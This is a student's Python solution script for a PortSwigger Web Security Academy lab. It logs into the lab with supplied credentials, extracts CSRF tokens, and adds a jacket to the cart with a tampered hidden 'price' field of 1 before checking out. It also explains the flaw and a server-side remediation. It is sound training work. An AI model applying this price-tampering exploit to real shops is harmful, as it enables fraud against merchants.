"""
Tristan Gomez - CS 595
Spring 2021

The code below solves the PortSwigger level: Excessive trust in client-side controls

Level Description:
    This lab doesn't adequately validate user input. 
    You can exploit a logic flaw in its purchasing workflow to buy items for an unintended price. 
    To solve the lab, buy a "Lightweight l33t leather jacket".

    You can log in to your own account using the following credentials: wiener:peter 

Vulnerability Description:
    Upon closer inspection of the form which adds the jacket to the cart, one can see several hidden
    form fields. The main field of interest to us is the "price" field. This field can be controlled
    by the client. The profile that is given for the level has only $100 of credit to their name, so 
    they cannot outright afford the jacket. Since we can control the price field, we can change it to 
    $1 and POST the request, adding it to the cart. Since we set the price, we can now buy it and solve 
    the level.

Remediation:
    The site's developers should remove the hidden "price" field from the form submission. When a client
    adds a product to their cart a database on the back-end should be queried using the product ID number.
    The database would receive the product ID and then return its correct price to the cart. 
"""

# We need to include the "requests" library to allow us to programatically make GET and POST requests.
# We need "BeautifulSoup" in order to parse HTML pages and extract values from them like CSRF tokens.
import requests
from bs4 import BeautifulSoup

site = "aced1f121e8544e980e0a7460076006b.web-security-academy.net"
s = requests.Session()
login_url = f"https://{site}/login"

"""
    Below, we send a GET request for the login page,
    and using BeautifulSoup we extract the CSRF token for the 
    login form. We then package the CSRF token and default
    profile information into a login_data object.
"""
resp = s.get(login_url)
soup = BeautifulSoup(resp.text,'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')

login_data = {
    'csrf' : csrf,
    'username' : 'wiener',
    'password' : 'peter'
}

resp = s.post(login_url, data=login_data)
print(f"Login response: {resp.status_code}")


"""
    Once logged in, we will add the jacket to the cart
    using a POST request. Notice that we have set the 'price' 
    field to a value of '1' instead of using its original price.
"""
cart_url = f"https://{site}/cart"
cart_data = {
    'productId': '1',
    'redir' : 'PRODUCT',
    'quantity' : '1',
    'price' : '1'
}

resp = s.post(cart_url, data=cart_data)
print(f"Add to cart response: {resp.status_code}")


"""
    Once the jacket has been added to the cart, we
    need to send a GET request to the /cart page so
    we can use BeautifulSoup to extract the CSRF token
    that is needed to checkout.
"""
cart_url = f"https://{site}/cart"

resp = s.get(cart_url)
soup = BeautifulSoup(resp.text,'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')

"""
    Finally, we will package the CSRF token into a 
    checkout_data object that only has one field, 'csrf'.
"""
checkout_data = { 'csrf' : csrf }
resp = s.post(f"{cart_url}/checkout", data=checkout_data)
print(f"checkout response: {resp.status_code}")